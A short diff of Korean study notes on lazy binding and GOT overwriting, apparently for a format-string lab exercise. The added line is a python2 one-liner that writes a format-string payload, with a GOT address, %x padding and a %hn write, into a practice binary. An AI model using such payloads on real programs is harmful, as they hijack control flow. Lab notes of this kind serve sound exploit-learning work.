@@ -71,4 +71,4 @@ Lazy Binding
 1. GOT 어떤 Entry가 Exit()인지 찾을것 R=GOT
 	1. objdump -R
 2. nm 명ㄹ여어
-3. 
+3. python2 -c "print '\x24\xc0\x04\x08' + '%09x.'*7 + '37420%x' + '%hn'" +  | ./formatstring_formats12_32
